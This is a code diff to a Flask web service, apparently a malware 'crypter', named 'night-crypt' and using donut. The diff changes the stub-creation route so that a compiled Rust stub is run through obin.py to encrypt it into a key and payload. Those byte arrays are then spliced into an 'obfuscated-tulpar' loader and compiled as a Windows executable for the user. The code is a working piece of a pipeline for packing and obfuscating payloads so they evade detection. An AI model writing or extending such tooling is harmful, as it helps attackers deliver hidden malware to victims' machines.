@@ -8,6 +8,7 @@ from pathlib import Path
 import donut
 import subprocess
 import hashlib  # Added hashlib for SHA256 hashing
+import re
 
 app = Flask(__name__)
 app.secret_key = 'night-crypt-secret-key-2024'
@@ -362,17 +363,75 @@ def create_stub():
                         result = subprocess.run(compile_cmd, cwd=os.path.join('templates', 'rust_stub'), capture_output=True, text=True, shell=True)
 
                         if result.returncode == 0:
-                            cpp_exe_created = exe_filename
-                            print(f"Successfully compiled Rust stub: {exe_filename}")
+                            # Run obin.py on the compiled stub
+                            compiled_stub_path = os.path.join('templates', 'rust_stub', 'target', 'x86_64-pc-windows-gnu', 'release', 'rust_s.exe')
+                            obin_cmd = ['python3', 'obin.py', compiled_stub_path]
+                            obin_result = subprocess.run(obin_cmd, capture_output=True, text=True)
 
-                            # Move the compiled executable to the user's exe folder
-                            compiled_exe_path = os.path.join('templates', 'rust_stub', 'target', 'x86_64-pc-windows-gnu', 'release', 'rust_s.exe')
-                            os.rename(compiled_exe_path, exe_path)
+                            if obin_result.returncode != 0:
+                                print(f"obin.py failed: {obin_result.stderr}")
+                                return jsonify({'success': False, 'message': 'Failed to process stub with obin.py'}), 500
+
+                            # Read key.rs and payload.rs
+                            with open('key.rs', 'r') as f:
+                                key_rs = f.read()
+                            with open('payload.rs', 'r') as f:
+                                payload_rs = f.read()
+
+                            os.remove('key.rs')
+                            os.remove('payload.rs')
+
+                            # Extract the byte arrays
+                            key_match = re.search(r'const SECRET_KEY: &\[u8\] = &\[(.*?)\];', key_rs, re.DOTALL)
+                            payload_match = re.search(r'const PAYLOAD: &\[u8\] = &\[(.*?)\];', payload_rs, re.DOTALL)
+
+                            if not key_match or not payload_match:
+                                print(f"Could not extract key or payload")
+                                return jsonify({'success': False, 'message': 'Failed to extract key and payload from obin.py output'}), 500
+
+                            secret_key = key_match.group(1).strip()
+                            payload = payload_match.group(1).strip()
+
+                            # Read and modify obfuscated-tulpar's main.rs
+                            tulpar_main_path = os.path.join('templates', 'obfuscated-tulpar', 'src', 'main.rs')
+                            with open(tulpar_main_path, 'r', encoding='utf-8') as f:
+                                tulpar_code = f.read()
+
+                            original_tulpar_code = tulpar_code
+
+                            tulpar_code = re.sub(r'(const SECRET_KEY: &\[u8\] = &\[)[^]]*(\];)', f'\\1\n    {secret_key}\n\\2', tulpar_code)
+                            tulpar_code = re.sub(r'(const PAYLOAD: &\[u8\] = &\[)[^]]*(\];)', f'\\1\n    {payload}\n\\2', tulpar_code)
+
+                            with open(tulpar_main_path, 'w', encoding='utf-8') as f:
+                                f.write(tulpar_code)
+
+                            # Compile obfuscated-tulpar
+                            tulpar_compile_cmd = [
+                                'cargo', 'build', '--release', '--target', 'x86_64-pc-windows-gnu'
+                            ]
+                            tulpar_result = subprocess.run(tulpar_compile_cmd, cwd=os.path.join('templates', 'obfuscated-tulpar'), capture_output=True, text=True, shell=True)
+
+                            # Restore original tulpar code
+                            with open(tulpar_main_path, 'w', encoding='utf-8') as f:
+                                f.write(original_tulpar_code)
+
+                            if tulpar_result.returncode == 0:
+                                cpp_exe_created = exe_filename
+                                print(f"Successfully compiled obfuscated-tulpar: {exe_filename}")
+
+                                # Move the compiled executable
+                                compiled_tulpar_path = os.path.join('templates', 'obfuscated-tulpar', 'target', 'x86_64-pc-windows-gnu', 'release', 'tulpar.exe')
+                                os.rename(compiled_tulpar_path, exe_path)
+                            else:
+                                print(f"obfuscated-tulpar compilation failed: {tulpar_result.stderr}")
+                                return jsonify({'success': False, 'message': 'Failed to compile the final stub'}), 500
                         else:
                             print(f"Rust compilation failed: {result.stderr}")
+                            return jsonify({'success': False, 'message': 'Failed to compile the initial stub'}), 500
 
                     except Exception as rust_error:
                         print(f"Error creating Rust stub: {rust_error}")
+                        return jsonify({'success': False, 'message': 'An error occurred during the stub creation process'}), 500
 
                     os.remove(temp_file_path)
 
